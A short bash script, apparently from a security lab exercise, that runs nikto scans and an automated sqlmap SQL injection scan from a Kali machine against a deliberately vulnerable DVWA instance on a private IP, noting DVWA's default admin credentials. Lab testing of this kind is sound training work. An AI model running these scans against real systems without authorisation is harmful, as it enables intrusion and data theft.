#!/bin/bash
# Test 2/3/7: Web application attacks against the DVWA target on IoT-Sim.
# Run from Kali-Attacker. Requires nikto and sqlmap installed:
#   sudo apt install -y nikto sqlmap
#
# Note: sqlmap requires a valid PHPSESSID cookie from an authenticated DVWA
# session — log in via browser first (http://192.168.30.20:8080/login.php,
# default creds admin/password) and copy the session cookie.

TARGET="192.168.30.20"
PORT="8080"

echo "== Nikto default scan =="
nikto -h "$TARGET" -p "$PORT"

echo "== Nikto tuned scan (CVE/exploit-focused checks) =="
nikto -h "$TARGET" -p "$PORT" -Tuning 9

echo "== sqlmap automated SQL injection scan =="
echo "Replace <session> below with a real PHPSESSID from a logged-in DVWA session."
sqlmap -u "http://${TARGET}:${PORT}/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=<session>" --batch
